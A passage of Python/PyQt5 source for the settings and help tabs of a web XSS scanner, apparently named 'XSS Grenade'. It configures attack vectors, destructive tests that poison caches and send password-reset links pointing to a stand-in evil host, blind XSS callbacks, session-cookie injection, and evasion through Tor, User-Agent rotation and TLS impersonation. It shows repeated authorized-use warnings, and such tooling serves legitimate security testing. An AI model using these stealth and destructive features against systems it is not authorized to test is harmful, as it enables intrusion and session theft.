        #   - Stored XSS via headers (logy / admin panel)
        # Při zaškrtnutí vyleze QMessageBox který vyžaduje EXPLICITNÍ
        # potvrzení autorizace. Pokud user dá Cancel, checkbox se vrátí
        # do unchecked stavu.
        self.ck_destructive = QCheckBox("⚠ Destructive testing (PERSISTENT IMPACT)")
        self.ck_destructive.setChecked(False)
        self.ck_destructive.setStyleSheet(
            "QCheckBox { color: #ff5555; font-weight: bold; }"
        )
        self.ck_destructive.setToolTip(
            "⚠ WARNING: These tests leave persistent state on the server!\n\n"
            "Activates:\n"
            "  • Cache Poisoning — payload cached for ALL visitors\n"
            "  • Host Header injection with password-reset trigger\n"
            "  • Stored XSS via custom headers\n\n"
            "Only for AUTHORIZED targets (your own servers, bug bounty\n"
            "with explicit in-scope permission, contracted pentest)!\n\n"
            "Requires explicit authorization confirmation dialog."
        )
        # Hook na clicked signal — spustí warning dialog
        self.ck_destructive.clicked.connect(self._handle_destructive_checkbox_click)

        # v10.14: Email input pro Host Header password reset test —
        # zobrazuje se pouze pokud destructive checkbox je zaškrtnutý.
        # Real password reset email PŮJDE na tuto adresu pokud server
        # je vulnerable — musí být pod kontrolou pentestera.
        self.inp_destructive_email = QLineEdit()
        self.inp_destructive_email.setPlaceholderText(
            "test email for Host Header reset (e.g. pentester@example.com)"
        )
        self.inp_destructive_email.setEnabled(False)  # disabled until ck_destructive
        self.inp_destructive_email.setToolTip(
            "Email address UNDER YOUR CONTROL.\n\n"
            "If the server is vulnerable to Host Header injection, a REAL\n"
            "password-reset email WILL BE DELIVERED to this address with a\n"
            "link pointing to the evil host (xsgs-evil-attacker.example.com).\n\n"
            "If this field is left empty, the Host Header reset test is\n"
            "SKIPPED (no email will be sent)."
        )
        self.inp_destructive_email.setObjectName("destructive_input")
        # Hook: enable input pouze pokud destructive je zaškrtnutý
        # (po úspěšném potvrzení dialogu)
        self.ck_destructive.toggled.connect(
            lambda checked: self.inp_destructive_email.setEnabled(checked)
        )

        # ── Layout: 4 named subsections within "Vectors and Functions" ──
        # Each subsection has a left-aligned header label spanning all 3
        # columns, followed by checkboxes laid out 3 per row. This makes
        # the taxonomy of XSS attack types visible at a glance — the user
        # learns "Stored XSS is Classic, DOM v6 is DOM-based, Trusted
        # Types is Framework, CSP Bypass is Bypass-class" just from the UI.
        #
        # Scanner behavior flags (canary/rotation/follow/ssl/verbose) move
        # to a separate group g3b below — they're operational toggles, not
        # vulnerability classes.
        #
        # Categorization rationale:
        #   Classic XSS    — server-side reflection / persistence / OOB
        #                    (the historical bread-and-butter of XSS)
        #   DOM-based      — client-side sinks; static + runtime analysis
        #   Framework      — modern app patterns (Trusted Types policies,
        #                    prototype pollution gadgets, SSR hydration,
        #                    DOM clobbering — all rely on framework-level
        #                    abstractions)
        #   Bypass         — defense-evasion modules + param discovery
        #                    (these don't FIND new bugs alone; they
        #                    increase reach for the detection modules)

        from PyQt5.QtWidgets import QFrame

        def _section_header(text: str) -> QLabel:
            """Small themed section label — styled via QSS objectName
            (#settings_section) so it re-colors live on theme switch: graphite
            in light (calm on the eye), soft pink in dark."""
            lbl = QLabel(text)
            lbl.setObjectName("settings_section")
            return lbl

        # Each section is (header text, [checkbox, ...]).
        # Lay out 3 per row within each section. Header spans all 3 columns.
        sections = [
            ("─── CLASSIC XSS ───", [
                self.ck_post, self.ck_json, self.ck_hdr,
                self.ck_path, self.ck_cookie,
                self.ck_stored, self.ck_blind, self.ck_ctx,
                self.ck_fuzz,
            ]),
            ("─── DOM-BASED ───", [
                self.ck_dom, self.ck_dom_v6, self.ck_static_js,
                self.ck_sourcemap,
                self.ck_headless, self.ck_postmsg, self.ck_websock,
            ]),
            ("─── FRAMEWORK / MODERN ───", [
                self.ck_trusted_types, self.ck_proto_pollution,
                self.ck_dom_clobbering, self.ck_ssr_hydration,
                self.ck_stored_roundtrip,
            ]),
            ("─── BYPASS & DISCOVERY ───", [
                self.ck_csp_bypass, self.ck_adaptive_waf,
                self.ck_open_redirect, self.ck_param_wordlist,
                self.ck_jsonp, self.ck_dangling, self.ck_svg,
                self.ck_graphql, self.ck_markdown, self.ck_css,
                self.ck_htmx_alpine, self.ck_dompurify_cfg,
                self.ck_cache_poison,
            ]),
            # v10.16: resume/checkpoint dlouhých skenů
            ("─── SCAN CONTROL ───", [
                self.ck_resume, self.ck_html_report,
                self.ck_txt_report, self.ck_json_report,
            ]),
            # v10.58: CLI parity — reports, evidence, header scans, protocol
            ("─── REPORTS & EVIDENCE ───", [
                self.ck_sarif, self.ck_poc, self.ck_evidence,
            ]),
            ("─── HEADER SCANS (default on) ───", [
                self.ck_cors, self.ck_crlf, self.ck_xssi,
            ]),
            ("─── PROTOCOL & WARM-UP ───", [
                self.ck_legacy_tls, self.ck_warmup, self.ck_ua_fresh,
            ]),
            # v10.15: SSRF — aktivní vektor, opt-in s autorizačním dialogem
            ("─── ⚠ ACTIVE PROBES (authorized only) ───", [
                self.ck_ssrf,
            ]),
            # v10.14: DESTRUCTIVE TESTS — jen jeden checkbox, ten řídí
            # všechny destructive scanners (Cache Poisoning, Host Header
            # password reset, Stored XSS via headers). Vyžaduje
            # explicitní autorizaci přes warning dialog.
            ("─── ⚠ DESTRUCTIVE (PERSISTENT IMPACT) ───", [
                self.ck_destructive,
            ]),
        ]

        current_row = 0
        for header_text, checkboxes in sections:
            # Section header — spans all 3 columns
            header = _section_header(header_text)
            g3l.addWidget(header, current_row, 0, 1, 3)
            current_row += 1
            # Checkboxes — 3 per row
            for i, c in enumerate(checkboxes):
                g3l.addWidget(c, current_row + (i // 3), i % 3)
            # Advance current_row by the number of rows this section took
            current_row += (len(checkboxes) + 2) // 3
            # v10.14: Po destructive sekci přidat email input field
            # na samostatný řádek (3 sloupce, full-width).
            if "DESTRUCTIVE" in header_text:
                g3l.addWidget(self.inp_destructive_email,
                              current_row, 0, 1, 3)
                current_row += 1

        # ── Blind OOB URL — visually separated row beneath all sections ──
        # Lives at the bottom of the "Classic XSS" thinking — it's the
        # callback URL for the Blind XSS checkbox, which sits above.
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setFrameShadow(QFrame.Sunken)
        sep.setStyleSheet("color: #333; margin-top: 10px;")
        g3l.addWidget(sep, current_row, 0, 1, 3)
        current_row += 1

        blind_label = QLabel("Blind OOB URL")
        blind_label.setStyleSheet("color: #b0b0b0; padding-top: 4px;")
        g3l.addWidget(blind_label, current_row, 0)

        self.inp_blind_oob = QLineEdit()
        self.inp_blind_oob.setPlaceholderText(
            "https://xss.hunter/api  (callback URL — see tooltip)")
        self.inp_blind_oob.setToolTip(
            "Callback URL for Blind XSS (OOB) payloads.\n\n"
            "When Blind XSS is enabled, every injected payload includes a "
            "fetch/script load to this URL with a unique marker. When the "
            "payload eventually executes (sometimes hours later, in an admin's "
            "browser), your callback server receives the marker plus context.\n\n"
            "POPULAR CALLBACK SERVICES:\n"
            "  • xss.hunter.report (self-hosted: github.com/mandatoryprogrammer/xsshunter-express)\n"
            "  • Burp Collaborator (Burp Suite Pro)\n"
            "  • interactsh (projectdiscovery.io)\n\n"
            "Without an OOB URL, the Blind XSS scanner does nothing — the "
            "checkbox will warn you at scan start.")
        g3l.addWidget(self.inp_blind_oob, current_row, 1, 1, 2)

        v.addWidget(g3)

        # ── Scanner behavior (separate group — operational flags, not detection) ──
        g3b = QGroupBox("Scanner behavior")
        g3bl = QGridLayout(g3b)
        behavior_checkboxes = [
            self.ck_mark,    # Marker parameter — adds _=xxx cache-buster
            self.ck_can,     # Fast scan — small high-signal payload set instead of full list
            self.ck_rota,    # User-Agent rotation
            self.ck_foll,    # Follow HTTP redirects
            self.ck_ssl,     # SSL verification
            self.ck_verb,    # Verbose log output
        ]
        for i, c in enumerate(behavior_checkboxes):
            g3bl.addWidget(c, i // 3, i % 3)
        v.addWidget(g3b)

        # Fuzzer parametry — platí jen když je fuzzer aktivní
        gfz = QGroupBox("Fuzzer params"); gfzl = QGridLayout(gfz)
        gfzl.addWidget(QLabel("Top hits / parameter"), 0, 0)
        self.sp_fz_topn = QSpinBox(); self.sp_fz_topn.setRange(1, 10); self.sp_fz_topn.setValue(3)
        self.sp_fz_topn.setToolTip("Max number of hits recorded per (URL, parameter) pair — then it moves to the next one")
        gfzl.addWidget(self.sp_fz_topn, 0, 1)

        gfzl.addWidget(QLabel("Batch size"), 0, 2)
        self.sp_fz_batch = QSpinBox(); self.sp_fz_batch.setRange(4, 64); self.sp_fz_batch.setValue(16)
        self.sp_fz_batch.setToolTip("How many mutated payloads to generate in one batch")
        gfzl.addWidget(self.sp_fz_batch, 0, 3)

        gfzl.addWidget(QLabel("Max iterations"), 1, 0)
        self.sp_fz_iters = QSpinBox(); self.sp_fz_iters.setRange(20, 1000); self.sp_fz_iters.setValue(200)
        self.sp_fz_iters.setToolTip("Max attempts per parameter (hard cap)")
        gfzl.addWidget(self.sp_fz_iters, 1, 1)

        gfzl.addWidget(QLabel("Time budget (s)"), 1, 2)
        self.sp_fz_budget = QSpinBox(); self.sp_fz_budget.setRange(10, 600); self.sp_fz_budget.setValue(60)
        self.sp_fz_budget.setToolTip("Total time for the fuzz phase — fuzzing ends when it expires")
        gfzl.addWidget(self.sp_fz_budget, 1, 3)

        self.ck_fz_probe = QCheckBox("Context probe (reflection context detection)")
        self.ck_fz_probe.setChecked(True)
        self.ck_fz_probe.setToolTip("If enabled, the fuzzer first determines the context where the parameter reflects (script/attr/url/html) and picks mutators accordingly")
        gfzl.addWidget(self.ck_fz_probe, 2, 0, 1, 4)
        v.addWidget(gfz)

        g4 = QGroupBox("Outputs & proxy"); g4l = QGridLayout(g4)
        g4l.addWidget(QLabel("Proxy"),0,0);       self.inp_prx = QLineEdit(); self.inp_prx.setPlaceholderText("http://127.0.0.1:8080  or  socks5h://127.0.0.1:1080"); g4l.addWidget(self.inp_prx,0,1)
        # v10.16: TXT/JSON report cesty už nejsou v UI — reporty se zapínají
        # checkboxy (TXT report / JSON report / HTML report) ve scan options.
        # Cesty jsou fixní defaulty (xss_report.txt/json/html v pracovním adresáři);
        # hidden QLineEdit držíme jen kvůli zpětné kompatibilitě s cfg/load logikou.
        self.inp_rep = QLineEdit(); self.inp_rep.setText("xss_report.txt"); self.inp_rep.hide()
        self.inp_jrp = QLineEdit(); self.inp_jrp.setText("xss_report.json"); self.inp_jrp.hide()
        v.addWidget(g4)

        # ── v10.58: Advanced (CLI parity) — combos / spinboxes / text that
        # have no checkbox equivalent (scan-intensity, TLS impersonation, DOM
        # timing, evidence governance, stored-verify URLs). ──
        g_adv = QGroupBox("Advanced  (CLI parity)")
        g_adv_l = QGridLayout(g_adv)
        g_adv_l.addWidget(QLabel("Scan intensity"), 0, 0)
        self.cmb_intensity = QComboBox()
        self.cmb_intensity.addItems(["(default)", "stealth", "normal", "fast"])
        self.cmb_intensity.setToolTip("CLI: --scan-intensity. Behavioral request "
            "timing profile ((default) = engine default).")
        g_adv_l.addWidget(self.cmb_intensity, 0, 1)
        g_adv_l.addWidget(QLabel("TLS impersonation"), 1, 0)
        self.cmb_cffi = QComboBox()
        # Mirrors engine CURL_CFFI_PROFILES; "(off)" = None, "rotate" = per-request.
        self.cmb_cffi.addItems(["(off)", "rotate", "chrome131", "chrome124",
            "chrome120", "chrome116", "firefox133", "firefox120", "safari18_0",
            "safari17_0", "edge131"])
        self.cmb_cffi.setToolTip("CLI: --cffi-impersonate. Browser TLS+HTTP2 "
            "impersonation via curl_cffi (Cloudflare/Akamai). Requires curl_cffi.")
        g_adv_l.addWidget(self.cmb_cffi, 1, 1)
        g_adv_l.addWidget(QLabel("DOM wait (s)"), 2, 0)
        self.sp_dom_wait = QDoubleSpinBox(); self.sp_dom_wait.setRange(0.0, 30.0)
        self.sp_dom_wait.setSingleStep(0.5); self.sp_dom_wait.setValue(2.0)
        self.sp_dom_wait.setToolTip("CLI: --dom-wait. Settle time per page for "
            "DOM/headless analysis.")
        g_adv_l.addWidget(self.sp_dom_wait, 2, 1)
        g_adv_l.addWidget(QLabel("DOM budget (s)"), 3, 0)
        self.sp_dom_budget = QSpinBox(); self.sp_dom_budget.setRange(1, 600)
        self.sp_dom_budget.setValue(45)
        self.sp_dom_budget.setToolTip("CLI: --dom-budget-secs. Total time budget "
            "for the DOM/headless phase.")
        g_adv_l.addWidget(self.sp_dom_budget, 3, 1)
        g_adv_l.addWidget(QLabel("Evidence origin"), 4, 0)
        self.cmb_evidence_origin = QComboBox()
        self.cmb_evidence_origin.addItems(["public", "consented", "client"])
        self.cmb_evidence_origin.setToolTip("CLI: --evidence-origin. Data-governance "
            "tag on evidence records (only used when Evidence store is on).")
        g_adv_l.addWidget(self.cmb_evidence_origin, 4, 1)
        g_adv_l.addWidget(QLabel("Evidence retention (days, 0=∞)"), 5, 0)
        self.sp_evidence_ret = QSpinBox(); self.sp_evidence_ret.setRange(0, 3650)
        self.sp_evidence_ret.setValue(0)
        self.sp_evidence_ret.setToolTip("CLI: --evidence-retention-days. 0 = no "
            "retention limit.")
        g_adv_l.addWidget(self.sp_evidence_ret, 5, 1)
        g_adv_l.addWidget(QLabel("Stored verify URLs"), 6, 0)
        self.inp_stored_verify = QLineEdit()
        self.inp_stored_verify.setPlaceholderText(
            "comma/space-separated URLs to check for stored markers (--stored-verify-url)")
        self.inp_stored_verify.setToolTip("CLI: --stored-verify-url. Extra pages to "
            "scan for a persisted marker (e.g. an admin/detail view).")
        g_adv_l.addWidget(self.inp_stored_verify, 6, 1)
        g_adv_l.addWidget(QLabel("Stored wait (s)"), 7, 0)
        self.sp_stored_wait = QDoubleSpinBox(); self.sp_stored_wait.setRange(0.0, 60.0)
        self.sp_stored_wait.setSingleStep(0.5); self.sp_stored_wait.setValue(1.0)
        self.sp_stored_wait.setToolTip("CLI: --stored-wait. Delay before checking "
            "view pages for a persisted marker (lets async writes settle).")
        g_adv_l.addWidget(self.sp_stored_wait, 7, 1)
        g_adv_l.addWidget(QLabel("Target country (2-letter)"), 8, 0)
        self.inp_target_country = QLineEdit(); self.inp_target_country.setMaxLength(2)
        self.inp_target_country.setPlaceholderText("e.g. CZ, US, DE  (Accept-Language / Tor exit)")
        self.inp_target_country.setToolTip("CLI: --target-country. Boosts matching "
            "Accept-Language weights and (with Tor) prefers an exit in that country.")
        g_adv_l.addWidget(self.inp_target_country, 8, 1)
        g_adv_l.addWidget(QLabel("Custom UA pool file"), 9, 0)
        self.inp_ua_file = QLineEdit()
        self.inp_ua_file.setPlaceholderText("path to a User-Agent list file (--ua-file)")
        self.inp_ua_file.setToolTip("CLI: --ua-file. Rotate User-Agents from your "
            "own file (one UA per line) instead of the built-in / live pool.")
        g_adv_l.addWidget(self.inp_ua_file, 9, 1)
        v.addWidget(g_adv)

        # ── Authentication (v10.15) ──────────────────────────────────────
        # Cookie injection for authenticated scanning. Paste a Cookie
        # header from browser DevTools — the scanner uses that session for
        # every request, unlocking admin panels and other gated surface.
        g_auth = QGroupBox("Authentication  —  cookie injection")
        g_auth_l = QGridLayout(g_auth)

        g_auth_l.addWidget(QLabel("Cookies"), 0, 0)
        self.inp_auth_cookies = QLineEdit()
        self.inp_auth_cookies.setPlaceholderText(
            "PHPSESSID=abc123; remember=xyz; theme=dark    (paste from "
            "browser DevTools → Application → Cookies)")
        self.inp_auth_cookies.setToolTip(
            "Cookie header value for authenticated scanning.\n\n"
            "HOW TO GET IT:\n"
            "  1. Open the target site in your browser, log in manually.\n"
            "  2. Open DevTools (F12) → Application tab → Cookies.\n"
            "  3. Select all rows → right-click → Copy as 'Cookie' header.\n"
            "     (or just copy individual 'name=value' pairs separated by ; )\n\n"
            "FORMAT:\n"
            "  PHPSESSID=abc123; remember_me=xyz; theme=dark\n\n"
            "EFFECT:\n"
            "  Every scanner request runs with this session. Unlocks the "
            "~80% of XSS bugs that hide behind authentication — admin "
            "panels, user profiles, settings, internal dashboards.\n\n"
            "SECURITY NOTE:\n"
            "  Cookies stay in memory only; they're not written to the "
            "JSON report or any log file. Don't commit them to git.\n\n"
            "FALLBACK:\n"
            "  If the session looks expired (scanner detects login page), "
            "scan continues anonymously with a warning. There's no auto "
            "re-login yet — paste fresh cookies and re-run."
        )
        # Treat as password field — don't shoulder-surf risk
        self.inp_auth_cookies.setEchoMode(QLineEdit.Password)
        g_auth_l.addWidget(self.inp_auth_cookies, 0, 1, 1, 2)

        # Show/hide cookie value toggle
        self.btn_show_cookies = QPushButton("Show")
        self.btn_show_cookies.setCheckable(True)
        self.btn_show_cookies.setFixedWidth(60)
        def _toggle_cookies_visibility(checked):
            self.inp_auth_cookies.setEchoMode(
                QLineEdit.Normal if checked else QLineEdit.Password)
            self.btn_show_cookies.setText("Hide" if checked else "Show")
        self.btn_show_cookies.toggled.connect(_toggle_cookies_visibility)
        g_auth_l.addWidget(self.btn_show_cookies, 0, 3)

        # Status indicator — populated after scan start
        self.lbl_auth_status = QLabel("auth: anonymous")
        self.lbl_auth_status.setStyleSheet("color: #808080; font-size: 11px;")
        g_auth_l.addWidget(self.lbl_auth_status, 1, 1, 1, 2)

        v.addWidget(g_auth)

        # ── Anonymization / Tor ─────────────────────────────────────────
        g_anon = QGroupBox("Anonymization  —  Tor  +  UA rotation")
        g_anon_l = QGridLayout(g_anon)

        # Row 0: Tor enable + control port
        self.ck_tor = QCheckBox("Route through Tor (SOCKS5)")
        self.ck_tor.setToolTip(
            "All HTTP traffic will go through the Tor SOCKS5 proxy (127.0.0.1:9050). "
            "Requires a running Tor daemon. DNS resolution through Tor (no DNS leak). "
            "Automatically takes over the Proxy field above."
        )
        g_anon_l.addWidget(self.ck_tor, 0, 0, 1, 2)

        g_anon_l.addWidget(QLabel("ControlPort"), 0, 2)
        self.sp_tor_ctrl = QSpinBox()
        self.sp_tor_ctrl.setRange(1, 65535)
        self.sp_tor_ctrl.setValue(9051)
        self.sp_tor_ctrl.setToolTip("Tor ControlPort (default 9051) — used for the NEWNYM signal.")
        g_anon_l.addWidget(self.sp_tor_ctrl, 0, 3)

        # Row 1: SOCKS port + password
        g_anon_l.addWidget(QLabel("SOCKS port"), 1, 0)
        self.sp_tor_socks = QSpinBox()
        self.sp_tor_socks.setRange(1, 65535)
        self.sp_tor_socks.setValue(9050)
        self.sp_tor_socks.setToolTip("Tor SOCKS5 port (default 9050).")
        g_anon_l.addWidget(self.sp_tor_socks, 1, 1)

        g_anon_l.addWidget(QLabel("Password"), 1, 2)
        self.inp_tor_pwd = QLineEdit()
        self.inp_tor_pwd.setEchoMode(QLineEdit.Password)
        self.inp_tor_pwd.setPlaceholderText("only if HashedControlPassword")
        self.inp_tor_pwd.setToolTip(
            "Password for the Tor ControlPort. Leave empty if you have "
            "CookieAuthentication 1 in torrc, or no authentication."
        )
        g_anon_l.addWidget(self.inp_tor_pwd, 1, 3)

        # Row 2: Circuit rotation + worker isolation
        g_anon_l.addWidget(QLabel("Circuit rotation every N req"), 2, 0)
        self.sp_tor_rot = QSpinBox()
        self.sp_tor_rot.setRange(0, 10000)
        self.sp_tor_rot.setValue(50)
        self.sp_tor_rot.setToolTip(
            "Rotate the Tor circuit (NEWNYM) every N requests. Default 50. "
            "0 = no periodic rotation (on-error only). Note: Tor has a min. "
            "interval of 10s, faster calls are ignored."
        )
        g_anon_l.addWidget(self.sp_tor_rot, 2, 1)

        self.ck_tor_iso = QCheckBox("Isolate circuit per worker")
        self.ck_tor_iso.setToolTip(
            "Each worker thread gets its own Tor circuit (via SOCKS5 username "
            "isolation). Requires IsolateSOCKSAuth in torrc. "
            "NOTE: the current version shows a warning — the per-worker session "
            "architecture is coming in the next release."
        )
        g_anon_l.addWidget(self.ck_tor_iso, 2, 2, 1, 2)

        # Row 3: UA rotate every
        g_anon_l.addWidget(QLabel("UA rotation every N req"), 3, 0)
        self.sp_ua_rot = QSpinBox()
        self.sp_ua_rot.setRange(1, 1000)
        self.sp_ua_rot.setValue(5)
        self.sp_ua_rot.setToolTip(
            "Rotate the User-Agent every N requests. Default 5 (burst mode — simulates "
            "a real user who doesn't change their UA on every request). "
            "Per-request rotation: set 1."
        )
        g_anon_l.addWidget(self.sp_ua_rot, 3, 1)

        # Tor status label (updates at scan start)
        self.lbl_tor_status = QLabel("Tor: not verified")
        self.lbl_tor_status.setStyleSheet("color: #808080; font-size: 11px;")
        g_anon_l.addWidget(self.lbl_tor_status, 3, 2, 1, 2)

        # Hint — links to ck_rota above
        hint = QLabel(
            "<span style='color:#b0b0b0'>"
            "Tip: enable \"Rotation User-Agent\" above + \"Tor\" here for full stealth mode. "
            "Requires:  <code>pip install stem 'requests[socks]'</code>  and a running Tor daemon."
            "</span>"
        )
        hint.setWordWrap(True)
        hint.setStyleSheet("font-size: 11px; padding: 4px;")
        g_anon_l.addWidget(hint, 4, 0, 1, 4)

        v.addWidget(g_anon)

        v.addStretch(); return sc

    # ══════════════════════════════════════════════════════════════════
    # THEME — živé přepnutí světlé/tmavé palety (v10.29)
    # ══════════════════════════════════════════════════════════════════

    def _on_theme_changed(self, *_):
        """Přepne paletu, aplikuje ji živě na celou aplikaci a uloží volbu."""
        name = self.cmb_theme.currentData() or "dark"
        if name not in PALETTES:
            name = "dark"
        set_active_theme(name)
        app = QApplication.instance()
        if app is not None:
            app.setStyleSheet(build_stylesheet(PALETTES[name]))
            # vynuť re-polish všech widgetů, ať objectName-stylované karty
            # (stat/mstat/about/help) vezmou novou paletu okamžitě
            try:
                from PyQt5.QtWidgets import QStyle
                for wdg in app.allWidgets():
                    wdg.style().unpolish(wdg)
                    wdg.style().polish(wdg)
                    wdg.update()
            except Exception:
                pass
        # ulož napříč sezeními
        try:
            QSettings("TX-C0RE", "XSS Grenade").setValue("ui/theme", name)
        except Exception:
            pass
        # překresli inline-stylované finding karty, ať vezmou novou paletu
        try:
            self._restyle_inline_widgets()
        except Exception:
            pass

    def _restyle_inline_widgets(self):
        """Přebarví prvky s inline stylem, které app-level stylesheet
        nepokrývá. HELP tab má text s HTML barvami (re-polish je nepřekreslí),
        tak ho přestavíme z aktuální palety. Bezpečné no-op při chybě."""
        # HELP tab: statický obsah s HTML span barvami → rebuild vezme paletu
        try:
            for i in range(self.tabs.count()):
                if self.tabs.tabText(i) == "HELP":
                    cur = self.tabs.currentIndex()
                    self.tabs.removeTab(i)
                    self.tabs.insertTab(i, self._t_help(), "HELP")
                    self.tabs.setCurrentIndex(cur)
                    break
        except Exception:
            pass
        rerender = getattr(self, "_rerender_findings", None)
        if callable(rerender):
            rerender()
        self._retheme_legacy()

    def _retheme_legacy(self):
        """Legacy widgets that predate the theme system hardcode dark-mode
        neutral colors — muted grays (#808080/#b0b0b0) and dark hairlines
        (#1a1a1a/#2a2a2a/#333) — in inline styles, plus one #b0b0b0 QLabel span
        (Tor hint). Those go faint/invisible on the light 'paper' background.
        Rewrite them to the active-theme tokens. The ORIGINAL token string is
        stashed in a widget property on first pass, so this re-derives correctly
        on EVERY later theme switch (not a one-way burn). Only neutral
        grays/hairlines are remapped; bright #fff/#ccc badge colors are
        intentional and left alone (help text handles its own via _t_help)."""
        mut = theme('fg_muted'); bd = theme('border')
        ss_reps = (("#b0b0b0", mut), ("#808080", mut),
                   ("#1a1a1a", bd), ("#2a2a2a", bd), ("#333", bd))
        txt_reps = (("#b0b0b0", mut), ("#808080", mut))
        try:
            for wd in self.findChildren(QWidget):
                orig = wd.property("_legacy_ss")
                if orig is None:
                    cur = wd.styleSheet()
                    if cur and any(tok in cur for tok, _ in ss_reps):
                        wd.setProperty("_legacy_ss", cur); orig = cur
                if orig is not None:
                    # Respect runtime restyles: status labels / the CSP score go
                    # green/amber/red at runtime. If the sheet changed since we
                    # last set it, stop managing this widget — don't clobber the
                    # live state with the muted default.
                    applied = wd.property("_legacy_applied")
                    if applied is None or wd.styleSheet() == applied:
                        new = orig
                        for a, b in ss_reps:
                            new = new.replace(a, b)
                        wd.setStyleSheet(new); wd.setProperty("_legacy_applied", new)
                if isinstance(wd, QLabel):
                    torig = wd.property("_legacy_txt")
                    if torig is None:
                        ct = wd.text()
                        if ct and ("#b0b0b0" in ct or "#808080" in ct):
                            wd.setProperty("_legacy_txt", ct); torig = ct
                    if torig is not None:
                        tapplied = wd.property("_legacy_txt_applied")
                        if tapplied is None or wd.text() == tapplied:
                            nt = torig
                            for a, b in txt_reps:
                                nt = nt.replace(a, b)
                            wd.setText(nt); wd.setProperty("_legacy_txt_applied", nt)
        except Exception:
            pass

    # ══════════════════════════════════════════════════════════════════
    # TAB — POMOC / BEST PRACTICE PROFILY
    # ══════════════════════════════════════════════════════════════════

    def _t_help(self):
        """
        Help tab — beginner-first information architecture (v10.59):
          1. What is XSS / what this tool does (plain language)
          2. Quick start in 3 steps
          3. Authorized-use warning
          4. "Which profile?" decision helper
          5. Profiles to click-apply (engagement + focus profiles) + recipes
          6. "Settings explained" — every switch in plain English (for everyone)
          7. Technical references (modules→phases, deeper detail) for power users
        A newcomer can start scanning without understanding any setting; the
        glossary is there for when they want to.
        """
        sc = QScrollArea(); sc.setWidgetResizable(True)
        inner = QWidget(); sc.setWidget(inner)
        v = QVBoxLayout(inner); v.setContentsMargins(14, 14, 14, 14); v.setSpacing(14)

        _acc0 = theme('accent_text'); _fg0 = theme('fg'); _mut0 = theme('fg_muted')

        # ── 1. What is this? (plain language, for newcomers) ──
        about = QLabel(
            f"<h2 style='color:{_acc0}; margin:0; letter-spacing:1px'>XSS GRENADE</h2>"
            f"<p style='color:{_fg0}; margin:8px 0 0; line-height:1.7; font-size:14px'>"
            "<b>It finds XSS bugs in websites — automatically.</b></p>"
            f"<p style='color:{_mut0}; margin:6px 0 0; line-height:1.7'>"
            "<b style='color:" + _fg0 + "'>XSS</b> (Cross-Site Scripting) is when a "
            "website lets an attacker sneak in a piece of JavaScript that then runs "
            "in <i>other</i> visitors' browsers — enough to steal their login "
            "session, read their data, or act as them. It's one of the most common "
            "web bugs.<br><br>"
            "This tool does the tedious part for you: it <b>crawls</b> the site, "
            "tries harmless test snippets in every input it finds, and then "
            "<b>opens the suspicious ones in a real Chrome browser</b> to check "
            "which actually execute. So you get <b style='color:" + _fg0 + "'>real, "
            "confirmed findings</b> — not a pile of maybes.</p>"
        )
        about.setWordWrap(True)
        about.setObjectName("help_panel")
        about.setAttribute(Qt.WA_StyledBackground, True)
        about.setStyleSheet("padding: 14px 16px;")
        v.addWidget(about)

        # ── 2. Quick start (3 steps) ──
        quick = QLabel(
            f"<h2 style='color:{_acc0}; margin:0'>&#9654; New here? Start in 3 steps</h2>"
            f"<ol style='color:{_fg0}; line-height:1.9; margin:8px 0 0; padding-left:22px'>"
            "<li><b>Paste the target URL</b> in the box at the top of the window — "
            "a site you <u>own</u> or have <u>written permission</u> to test.</li>"
            "<li><b>Not sure what to turn on?</b> Scroll down a little and click "
            f"<b style='color:#22c55e'>“Bug Bounty”</b> — a solid all-round profile "
            "that configures everything for you.</li>"
            "<li>Press <b style='color:#22c55e'>START</b>. Watch <b>LIVE OUTPUT</b> "
            "as it works; confirmed bugs land in the <b>Results</b> tab. Done? Export "
            "a <b>PoC bundle</b> or <b>HTML report</b>.</li>"
            "</ol>"
        )
        quick.setWordWrap(True)
        quick.setObjectName("help_panel")
        quick.setAttribute(Qt.WA_StyledBackground, True)
        quick.setStyleSheet("padding: 12px 16px;")
        v.addWidget(quick)

        # ── 3. Authorized-use warning (plain) ──
        warn0 = QLabel(
            "<b>&#9888; Only scan sites you own or are explicitly allowed to test.</b> "
            "Scanning someone else's site without written permission is illegal in "
            "most countries — treat this like a power tool.")
        warn0.setWordWrap(True)
        warn0.setStyleSheet(
            "background:#3a1d1d; border:1px solid #b91c1c; color:#fecaca; "
            "border-radius:8px; padding:10px 14px; font-size:13px;")
        v.addWidget(warn0)

        # ── 4. Which profile? (decision helper) ──
        pick = QLabel(
            f"<h2 style='color:{_acc0}; margin:0'>Which profile should I pick?</h2>"
            f"<p style='color:{_mut0}; margin:6px 0 8px; line-height:1.6'>"
            "A <b>profile</b> = a ready-made set of options. Click a card below to "
            "apply it, then just add the URL and hit Start. Match it to your target:</p>"
            f"<table style='color:{_fg0}; line-height:1.7; border-collapse:collapse'>"
            f"<tr><td style='padding:2px 14px 2px 0'>Don't know / a general first look</td>"
            f"<td><b style='color:#22c55e'>Bug Bounty</b></td></tr>"
            "<tr><td style='padding:2px 14px 2px 0'>Modern app (React / Vue / Angular, lots of JS)</td>"
            "<td><b style='color:#a855f7'>DOM-based / SPA</b></td></tr>"
            "<tr><td style='padding:2px 14px 2px 0'>Comments, reviews, profiles, uploads</td>"
            "<td><b style='color:#ec4899'>Stored / persistent</b></td></tr>"
            "<tr><td style='padding:2px 14px 2px 0'>Site is behind Cloudflare / a firewall (WAF)</td>"
            "<td><b style='color:#3b82f6'>WAF target</b></td></tr>"
            "<tr><td style='padding:2px 14px 2px 0'>Internal app, you want it done fast</td>"
            "<td><b style='color:#f97316'>Fast</b></td></tr>"
            "</table>"
            f"<p style='color:{_mut0}; margin:8px 0 0; line-height:1.6; font-size:12px'>"
            "Applying a profile fills in all "
            f"{self._count_toggles()} switches in the <b>Settings</b> tab for you — "
            "you never have to understand them to get started. Want to? See "
            "<b>“Settings explained”</b> further down.</p>"
        )
        pick.setWordWrap(True)
        pick.setStyleSheet("padding: 4px;")
        v.addWidget(pick)

        # ── section separator ──
        _sep0 = QLabel(f"<h2 style='color:{_acc0}; margin:14px 0 0'>Profiles — click to apply</h2>")
        _sep0.setTextFormat(Qt.RichText)
        v.addWidget(_sep0)

        # ── Profile 1: Bug Bounty ──
        v.addWidget(self._make_help_card(
            title="Bug Bounty  /  Authorized Pentest",
            color="#22c55e",
            when="The target has a HackerOne/Bugcrowd/Intigriti program and you have "
                 "written authorization. You want the maximum number of findings in a "
                 "reasonable time without risking an IP ban.",
            config_sections=[
                ("Anti-detection", [
